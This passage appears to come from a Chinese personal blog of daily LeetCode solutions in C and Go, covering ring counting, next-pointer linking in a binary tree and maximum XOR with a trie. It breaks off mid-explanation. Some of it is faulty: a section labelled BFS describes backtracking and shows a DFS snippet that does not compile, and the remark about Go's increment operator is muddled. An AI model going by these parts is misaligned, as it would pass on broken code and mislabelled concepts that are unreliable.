<strong>位置</strong>，也就是位于哪根杆上（<code>&#39;0&#39;</code> 到 <code>&#39;9&#39;</code>）。</li></ul><p>例如，<code>&quot;R3G2B1&quot;</code> 表示：共有 <code>n == 3</code> 个环，红色的环在编号为 3 的杆上，绿色的环在编号为 2 的杆上，蓝色的环在编号为 1 的杆上。</p><p>找出所有集齐 <strong>全部三种颜色</strong> 环的杆，并返回这种杆的数量。</p></blockquote><h5 id="C实现"><a href="#C实现" class="headerlink" title="C实现"></a>C实现</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N 100</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">countPoints</span><span class="params">(<span class="type">char</span> *rings)</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">countPoints</span><span class="params">(<span class="type">char</span> * rings)</span>&#123;</span><br><span class="line">    <span class="type">int</span> count[<span class="number">10</span>][<span class="number">3</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">int</span> len = <span class="built_in">strlen</span>(rings); </span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;len; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i%<span class="number">2</span> != <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="type">int</span> a = rings[i] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">            <span class="type">int</span> b = rings[i<span class="number">-1</span>] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">            <span class="keyword">switch</span> (b) &#123;</span><br><span class="line">                <span class="keyword">case</span>(<span class="string">&#x27;R&#x27;</span>-<span class="string">&#x27;0&#x27;</span>):</span><br><span class="line">                    b = <span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span>(<span class="string">&#x27;G&#x27;</span>-<span class="string">&#x27;0&#x27;</span>):</span><br><span class="line">                    b = <span class="number">1</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span>(<span class="string">&#x27;B&#x27;</span>-<span class="string">&#x27;0&#x27;</span>):</span><br><span class="line">                    b = <span class="number">2</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            count[a][b] += <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> x = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">10</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (count[i][<span class="number">0</span>] &gt; <span class="number">0</span> &amp;&amp; count[i][<span class="number">1</span>] &gt; <span class="number">0</span> &amp;&amp; count[i][<span class="number">2</span>] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        x++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> rings[<span class="number">2</span>*N];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, rings);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, countPoints(rings));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>优化点：使用<strong>状态压缩</strong>来表示不同的杆</p><ul><li>如果有R，那么<code>|=0b001</code></li><li>也就是如果有R，个位数一定会是1</li><li>如果最后三位都是1，那么满足条件</li></ul><h5 id="C优化"><a href="#C优化" class="headerlink" title="C优化"></a>C优化</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N 100</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">countPoints</span><span class="params">(<span class="type">char</span> *rings)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> rings[<span class="number">2</span>*N] = <span class="string">&quot;B1G1R1&quot;</span>;</span><br><span class="line">    <span class="comment">//scanf(&quot;%s&quot;, rings);</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, countPoints(rings));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">countPoints</span><span class="params">(<span class="type">char</span> * rings)</span>&#123;</span><br><span class="line">    <span class="type">int</span> count[<span class="number">10</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">int</span> len = <span class="built_in">strlen</span>(rings); </span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;len; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i%<span class="number">2</span> != <span class="number">0</span>)&#123;    <span class="comment">//杆的位置</span></span><br><span class="line">            <span class="type">int</span> a = rings[i] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">            <span class="type">int</span> b = rings[i<span class="number">-1</span>] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">            <span class="keyword">switch</span> (b) &#123;</span><br><span class="line">                <span class="keyword">case</span>(<span class="string">&#x27;R&#x27;</span>-<span class="string">&#x27;0&#x27;</span>):</span><br><span class="line">                    count[a]  |= <span class="number">1</span>;   <span class="comment">//0b001   </span></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span>(<span class="string">&#x27;G&#x27;</span>-<span class="string">&#x27;0&#x27;</span>):</span><br><span class="line">                    count[a]  |= <span class="number">2</span>;    <span class="comment">//0b010</span></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span>(<span class="string">&#x27;B&#x27;</span>-<span class="string">&#x27;0&#x27;</span>):</span><br><span class="line">                    count[a]  |= <span class="number">4</span>;    <span class="comment">//0b100</span></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> x = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">10</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (count[i] == <span class="number">7</span>) &#123;</span><br><span class="line">        x++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="go实现"><a href="#go实现" class="headerlink" title="go实现"></a>go实现</h5><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> N = <span class="number">10</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">countPoints</span><span class="params">(rings <span class="type">string</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">count := [<span class="number">10</span>]<span class="type">int</span>&#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&#125;</span><br><span class="line"><span class="built_in">len</span> := <span class="built_in">len</span>(rings)</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>; i++ &#123;</span><br><span class="line"><span class="keyword">if</span> i%<span class="number">2</span> != <span class="number">0</span> &#123;</span><br><span class="line">a := <span class="type">int</span>(rings[i] - <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">b := rings[i<span class="number">-1</span>]</span><br><span class="line"><span class="keyword">switch</span> b &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;R&#x27;</span>:</span><br><span class="line">count[a] |= <span class="number">0</span>b001 <span class="comment">// 0b001</span></span><br><span class="line"><span class="comment">//fmt.Printf(&quot;111，%d\n&quot;, a)</span></span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;G&#x27;</span>:</span><br><span class="line">count[a] |= <span class="number">0</span>b010 <span class="comment">// 0b010</span></span><br><span class="line"><span class="comment">//fmt.Printf(&quot;222,%d\n&quot;, a)</span></span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;B&#x27;</span>:</span><br><span class="line">count[a] |= <span class="number">0</span>b100 <span class="comment">// 0b100</span></span><br><span class="line"><span class="comment">//fmt.Printf(&quot;333，%d\n&quot;, a)</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">x := <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">10</span>; i++ &#123;</span><br><span class="line"><span class="keyword">if</span> count[i] == <span class="number">0</span>b111 &#123;</span><br><span class="line">x++</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> x</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">//var rings [2*N]char&#123;0&#125;;</span></span><br><span class="line">rings := <span class="string">&quot;B0B6G0R6R0R6G9&quot;</span></span><br><span class="line">result := countPoints(rings)</span><br><span class="line">fmt.Printf(<span class="string">&quot;最终的个数是%d\n&quot;</span>, result)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>注意</p></blockquote><ul><li>按位或那里可以使用：<code>1 , ob001 , 0x1</code></li><li>变量和数组的定义直接用<code>:=</code>来，很方便</li></ul><hr><h4 id="DAY2-117-填充每个节点的下一个右侧节点指针-Ⅱ"><a href="#DAY2-117-填充每个节点的下一个右侧节点指针-Ⅱ" class="headerlink" title="DAY2-117.填充每个节点的下一个右侧节点指针 Ⅱ"></a>DAY2-117.填充每个节点的下一个右侧节点指针 Ⅱ</h4><p>&#x3D;&#x3D;中等&#x3D;&#x3D;</p><p><a href="https://leetcode.cn/problems/populating-next-right-pointers-in-each-node-ii/description/">117.填充每个节点的下一个右侧节点指针 Ⅱ</a></p><h6 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h6><blockquote><p>给定一个二叉树：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">struct Node &#123;</span><br><span class="line">int val;</span><br><span class="line">Node *left;</span><br><span class="line">Node *right;</span><br><span class="line">Node *next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>填充它的每个 next 指针，让这个指针指向其下一个右侧节点。如果找不到下一个右侧节点，则将 next 指针设置为 <code>NULL</code> 。</p><p>初始状态下，所有 next 指针都被设置为 <code>NULL</code> 。</p><p><strong>示例 1：</strong></p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/117_sample.png" alt="img" style="zoom: 50%;" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：root = [1,2,3,4,5,null,7]</span><br><span class="line">输出：[1,#,2,3,#,4,5,7,#]</span><br><span class="line">解释：给定二叉树如图 A 所示，你的函数应该填充它的每个 next 指针，以指向其下一个右侧节点，如图 B 所示。序列化输出按层序遍历顺序（由 next 指针连接），&#x27;#&#x27; 表示每层的末尾。</span><br></pre></td></tr></table></figure></blockquote><h6 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h6><ul><li>BFS(广度优先算法)</li><li>链表</li><li>队列</li></ul><h5 id="前置知识总结"><a href="#前置知识总结" class="headerlink" title="前置知识总结"></a>前置知识总结</h5><h6 id="BFS"><a href="#BFS" class="headerlink" title="&#x3D;&#x3D;BFS&#x3D;&#x3D;"></a>&#x3D;&#x3D;BFS&#x3D;&#x3D;</h6><blockquote><p> 基本思想</p></blockquote><ul><li>为了求得问题的解，先选择一种可能的情况向前探索</li><li>在探索过程中，一旦发现原来的选择是错的，就退回一步重新选择，继续向前探索</li><li>如此反复进行，知道找到解或者证明无解</li></ul><blockquote><p>代码实现[C]</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a[<span class="number">520</span>];   <span class="comment">//存放当前组合的数组</span></span><br><span class="line"><span class="type">int</span> book[<span class="number">520</span>];   <span class="comment">//标记每个数是否被选中</span></span><br><span class="line"><span class="type">int</span> ans = <span class="number">0</span>;    <span class="comment">//记录符合条件的组合数目</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">DFS</span><span class="params">(<span class="type">int</span> cur)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(cur == k)&#123;   <span class="comment">//k个数已经选完，可以进行输出等操作</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="number">1</span> = <span class="number">0</span>; i&lt;curli++)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, a[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        ans++;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i&lt;n; i++)&#123;    <span class="comment">//遍历n个数，并从中选择K个数</span></span><br><span class="line">        <span class="keyword">if</span>(!book[i])&#123;       <span class="comment">//若没有被访问</span></span><br><span class="line">            book[i] = <span class="number">1</span>;     <span class="comment">//标记为访问</span></span><br><span class="line">            a[cur] = i;     <span class="comment">//选定本数，并加入数组</span></span><br><span class="line">            DFS(cur + <span class="number">1</span>);     <span class="comment">//递归，cur+1</span></span><br><span class="line">            book[i] = <span class="number">0</span>;     <span class="comment">//释放，标记为没被访问，方便下次引用</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>总的来说就是在一堆排列的数中找特定长度的数构成的集合</li></ul><h6 id="二叉树的层序遍历"><a href="#二叉树的层序遍历" class="headerlink" title="&#x3D;&#x3D;二叉树的层序遍历&#x3D;&#x3D;"></a>&#x3D;&#x3D;二叉树的层序遍历&#x3D;&#x3D;</h6><p>就是按照顺序从上到下从左到右打印每一行的数据</p><blockquote><p>队列实现：</p></blockquote><p>其实就是从上到下，从左到右依次将每个数放入到队列中，然后按顺序依次打印就是想要的结果。</p><p>实现过程<br>1、首先将二叉树的根节点push到队列中，判断队列不为NULL，就输出队头的元素，<br>2、判断节点如果有孩子，就将孩子push到队列中，<br>3、遍历过的节点出队列，<br>4、循环以上操作，直到Tree &#x3D;&#x3D; NULL。</p><p>查看下面图解</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/20180226001828381.png" alt="20180226001828381" style="zoom: 67%;" /><h5 id="C语言"><a href="#C语言" class="headerlink" title="C语言"></a>C语言</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span> &#123;</span></span><br><span class="line">  <span class="type">int</span> val;</span><br><span class="line">  Node *left;</span><br><span class="line">  Node *right;</span><br><span class="line">  Node *next;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> Node *<span class="title function_">connect</span><span class="params">(<span class="keyword">struct</span> Node *root)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!root) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">q</span>[10001];</span></span><br><span class="line">    <span class="type">int</span> left = <span class="number">0</span>, right = <span class="number">0</span>;</span><br><span class="line">    q[right++] = root;</span><br><span class="line">    <span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line">        <span class="type">int</span> n = right - left;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">last</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; ++i) &#123;</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">f</span> =</span> q[left++];</span><br><span class="line">            <span class="keyword">if</span> (f-&gt;left) &#123;</span><br><span class="line">                q[right++] = f-&gt;left;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (f-&gt;right) &#123;</span><br><span class="line">                q[right++] = f-&gt;right;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (i != <span class="number">1</span>) &#123;</span><br><span class="line">                last-&gt;next = f;</span><br><span class="line">            &#125;</span><br><span class="line">            last = f;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="Go语言"><a href="#Go语言" class="headerlink" title="Go语言"></a>Go语言</h5><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a Node.</span></span><br><span class="line"><span class="comment"> * type Node struct &#123;</span></span><br><span class="line"><span class="comment"> *     Val int</span></span><br><span class="line"><span class="comment"> *     Left *Node</span></span><br><span class="line"><span class="comment"> *     Right *Node</span></span><br><span class="line"><span class="comment"> *     Next *Node</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">connect</span><span class="params">(root *Node)</span></span> *Node &#123;</span><br><span class="line"><span class="keyword">if</span> root == <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> q [<span class="number">10001</span>]*Node</span><br><span class="line">left := <span class="number">0</span></span><br><span class="line">right := <span class="number">0</span></span><br><span class="line">q[right] = root</span><br><span class="line">right++</span><br><span class="line"><span class="keyword">for</span> left &lt; right &#123;</span><br><span class="line">n := right - left</span><br><span class="line"><span class="keyword">var</span> last *Node</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">1</span>; i &lt;= n; i++ &#123;</span><br><span class="line">f := q[left]</span><br><span class="line">left++</span><br><span class="line"><span class="keyword">if</span> f.Left != <span class="literal">nil</span> &#123;</span><br><span class="line">q[right] = f.Left</span><br><span class="line">right++</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> f.Right != <span class="literal">nil</span> &#123;</span><br><span class="line">q[right] = f.Right</span><br><span class="line">right++</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> last != <span class="literal">nil</span> &#123;</span><br><span class="line">last.Next = f</span><br><span class="line">&#125;</span><br><span class="line">last = f</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> root</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h6><ul><li><p>在Go语言中，没有后置递增操作符 <code>left++</code>。你可以在语句中分开写：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">go</span><br><span class="line">f := q[left]</span><br><span class="line">left++</span><br></pre></td></tr></table></figure><p>将这两行替换原有的 <code>Node *f = q[left++]</code></p></li></ul><hr><h4 id="DAY3-421-数组中两个数的最大异或值"><a href="#DAY3-421-数组中两个数的最大异或值" class="headerlink" title="DAY3-421.数组中两个数的最大异或值"></a>DAY3-421.数组中两个数的最大异或值</h4><p><a href="https://leetcode.cn/problems/maximum-xor-of-two-numbers-in-an-array/">421. 数组中两个数的最大异或值</a></p><p>&#x3D;&#x3D;中等&#x3D;&#x3D;</p><h6 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h6><blockquote><p>给你一个整数数组 <code>nums</code> ，返回 <code>nums[i] XOR nums[j]</code> 的最大运算结果，其中 <code>0 ≤ i ≤ j &lt; n</code> 。</p><p><strong>示例 1：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [3,10,5,25,2,8]</span><br><span class="line">输出：28</span><br><span class="line">解释：最大运算结果是 5 XOR 25 = 28.</span><br></pre></td></tr></table></figure><p><strong>示例 2：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [14,70,53,83,49,91,36,80,92,51,66,70]</span><br><span class="line">输出：127</span><br></pre></td></tr></table></figure><p><strong>提示：</strong></p><ul><li><code>1 &lt;= nums.length &lt;= 2 * 105</code></li><li><code>0 &lt;= nums[i] &lt;= 231 - 1</code></li></ul></blockquote><h6 id="考点-1"><a href="#考点-1" class="headerlink" title="考点"></a>考点</h6><ul><li>暴力</li><li>&#x3D;&#x3D;字典树(trie树)&#x3D;&#x3D;</li></ul><h6 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h6><ul><li>暴力：逐个求XOR，创建一个数据结构？存放两个值和XOR值，比较XOR，返回最大的那一组。时间复杂度：O(N^2)</li><li>字典树：时间复杂度：O(N)</li><li>贪心算法</li></ul><h5 id="C语言-1"><a href="#C语言-1" class="headerlink" title="C语言"></a>C语言</h5><h6 id="字典树"><a href="#字典树" class="headerlink" title="字典树"></a>字典树</h6><p>抄一抄leetcode官方题解：</p><blockquote><p>根据按位异或运算的性质，x&#x3D;ai⊕aj等价于 aj&#x3D;x⊕ai。我们可以根据这一变换，设计一种「<strong>从高位到低位依次确定 x 二进制表示的每一位</strong>」的方法，以此得到 x 的值。该方法的精髓在于：</p><p> 由于数组中的元素都在 [0, 2^{31}) 的范围内，那么我们可以将每一个数表示为一个长度为 31 位的二进制数（如果不满 31 位，在最高位之前补上若干个前导 0 即可）；<br> 这 31 个二进制位从低位到高位依次编号为 0,1,⋯ ,30.我们从最高位第 30 个二进制位开始，依次确定 x 的每一位是 0 还是 1；<br> 由于我们需要找出最大的 x，因此在枚举每一位时，我们先判断 x 的这一位是否能取到 1。如果能，我们取这一位为 1，否则我们取这一位为 0。</p><p>「判断 x 的某一位是否能取到 1」这一步骤并不容易。下面介绍两种判断的方法。</p><p>这里先使用字典树来求解：</p><p>思路与算法</p><p>我们也可以将数组中的元素看成长度为 31 的字符串，字符串中只包含 0 和 1。如果我们将字符串放入字典树中，那么在字典树中查询一个字符串的过程，恰好就是从高位开始确定每一个二进制位的过程。字典树的具体逻辑以及实现可以参考「208. 实现 Trie（前缀树）的官方题解」，这里我们只说明如何使用字典树解决本题。</p><p>根据 x&#x3D;ai⊕aj，我们枚举 ai，并将 a0,a1,⋯ ,ai−1 作为 aj放入字典树中，希望找出使得 x达到最大值的 aj。</p><p>如何求出 x呢？我们可以从字典树的根节点开始进行遍历，遍历的「参照对象」为 ai。在遍历的过程中，我们根据 ai的第 x 个二进制位是 0 还是 1，确定我们应当走向哪个子节点以继续遍历。假设我们当前遍历到了第 k个二进制位：</p><p> 如果 ai 的第 k 个二进制位为 0，那么我们应当往表示 1 的子节点走，这样 0⊕1&#x3D;1，可以使得 x 的第 k 个二进制位为 1。如果不存在表示 1 的子节点，那么我们只能往表示 0 的子节点走，x 的第 k 